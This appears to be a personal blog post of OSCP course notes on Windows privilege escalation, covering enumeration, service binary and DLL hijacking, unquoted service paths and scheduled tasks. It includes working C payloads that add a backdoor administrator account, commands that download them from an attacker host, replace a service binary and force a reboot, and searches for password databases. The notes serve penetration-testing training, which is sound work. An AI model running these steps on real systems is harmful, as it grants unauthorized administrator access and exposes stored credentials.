---
title: OSCP Windows Privilege Escalation
published: 2025-01-21
description: 'Windows Privilege Escalation Notes for OSCP'
image: './img/cover.png'
tags: [OSCP, Notes, Course]
category: 'Notes'
draft: false 
---

# 1. Enumerating Windows

- The SID string consists : S-R-X-Y
    - S : indicates that the string is a SID
    - R : stands for revision and is always set to "1"
    - X : determines the identifier authority
    - Y :


There are several key pieces of information we should always obtain:

- Username and hostname
    - `whoami`
- Group memberships of the current user
    - `whoami /groups`
- Existing users and groups
    - `Get-LocalUser`
    - `Get-LocalGroup`
    - `Get-LocalGroupMember Administrators`
- Operating system, version and architecture
    - `systeminfo`
- Network information
    - `ipconfig /all`
- Installed applications
    - `route print`
    - `netstat -ano`
- Running processes
    - 32bit : `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
    - 64bit : `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
    - `Get-Process`

We have identified that KeePass and XAMPP are installed on the system and therefore, we should search for password manager databases and configuration files of these applications.

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

runas allows us to run a program as a different user.

`runas /user:backupadmin cmd`

check the powershell history of a user : 

```bash
Get-History
(Get-PSReadlineOption).HistorySavePath
```

# 2. Leveraging Windows Services
## 2.1. Service Binary Hijacking

To get a list of all installed Windows services, we can choose various methods such as the GUI snap-in `services.msc`, the `Get-Service` Cmdlet, or the `Get-CimInstance` Cmdlet (superseding `Get-WmiObject`).

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

enumerate the permissions on both service binaries. We can choose between the traditional `icacls` Windows utility or the PowerShell Cmdlet `Get-ACL`.

|Mask	|Permissions|
|---|---|
|F	|Full access|
|M	|Modify access|
|RX	|Read and execute access|
|R	|Read-only access|
|W	|Write-only access|

```bash
icacls "C:\xampp\apache\bin\httpd.exe"
```

```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Next, we'll cross-compile6 the code on our Kali machine with mingw-64

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python -m http.server 80
```
```bash
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
# if Auto mean we may be able to restart the service by rebooting the machine.
whoami /priv
# look for SeShutdownPrivilege
# The Disabled state only indicates if the privilege is currently enabled for the running process.
shutdown /r /t 0
```

we can use PowerUp

```bash
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
.\PowerUp.ps1
Get-ModifiableServiceFile
```

## 2.2. DLL Hijacking

Standard DLL search order on current Windows versions

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Displaying information about the running service
```bash
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# test if we are able to create files in the directory with our current privileges.
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

:::Note
We can use Process Monitor5 to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by FileZilla as well as detect missing ones.

Unfortunately, we need administrative privileges to start Process Monitor and collect this data. However, the standard procedure in a penetration test would be to copy the service binary to a local machine. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.
:::

C++ DLL example code from Microsoft
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

add --shared to specify that we want to build a DLL.
Cross-Compile the C++ Code to a 64-bit DLL
```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

## 2.3. Unquoted Service Paths

We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.

Example of how Windows will try to locate the correct path of an unquoted service
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My Program\My.exe
4. C:\Program Files\My Program\My service\service.exe


List of services with binary path
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

:::Note
check if we can start and stop the identified service as steve with `Start-Service` and `Stop-Service`.
check access rights `icacls "C:\"`
:::

# 3. Abusing Other Windows Components
## 3.1. Scheduled Tasks

three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:

- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

We can view scheduled tasks on Windows with the `Get-ScheduledTask1` Cmdlet or the command `schtasks /query`.

```bash
schtasks /query /fo LIST /v
```

## 3.2. Using Exploits

Enumerating the Windows version and security patches
```bash
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```
# 4. Wrapping Up